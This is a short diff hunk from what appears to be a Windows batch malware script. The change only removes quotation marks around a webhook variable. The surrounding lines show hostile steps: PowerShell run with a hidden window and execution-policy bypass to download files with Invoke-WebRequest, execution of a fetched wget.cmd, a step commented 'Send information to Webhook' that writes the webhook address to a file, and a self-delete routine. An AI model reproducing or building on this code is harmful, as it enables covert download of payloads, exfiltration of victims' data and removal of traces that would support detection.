@@ -18,7 +18,7 @@ powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI
 powershell ./wget.cmd
 
 @REM Send information to Webhook
-echo "%WEBHOOK%" >> webhook
+echo %WEBHOOK% >> webhook
 
 @REM self delete
 cd "%INITIALPATH%"
